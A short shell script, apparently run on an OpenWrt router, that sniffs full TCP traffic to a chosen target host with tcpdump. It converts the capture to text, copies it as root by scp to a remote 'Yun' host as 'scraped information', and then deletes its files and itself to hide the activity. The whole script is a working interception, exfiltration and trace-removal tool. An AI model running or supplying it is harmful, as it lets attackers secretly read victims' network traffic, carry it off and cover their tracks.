echo "Starting sniffing"

#timeout 60s tcpdump -s 0 -i ra0 -A -x not port 22 and not port 23 and tcp and dst host 192.168.8.237 -w lsmm.pcap
timeout $1s tcpdump -s 0 -i ra0 -A -x not port 22 and not port 23 and tcp and dst host $2 -w lsmm.pcap

echo "Done capture for $1 secs"
echo "converting to txt file"
tcpdump -qns 0 -A -r lsmm.pcap > data.txt
sleep 10
echo "Done conversion"
sleep 10
#transfer the txt file to yun:
scp data.txt root@$3:/mnt/sda1/arduino/Poet -i ~/.ssh/id_rsa
echo "scraped information transferred back to Yun"
# wait for full transfer and then delete
sleep 60
rm data.txt;rm lsmm.pcap;rm dumper.sh
#echo "openwrt cleaned"
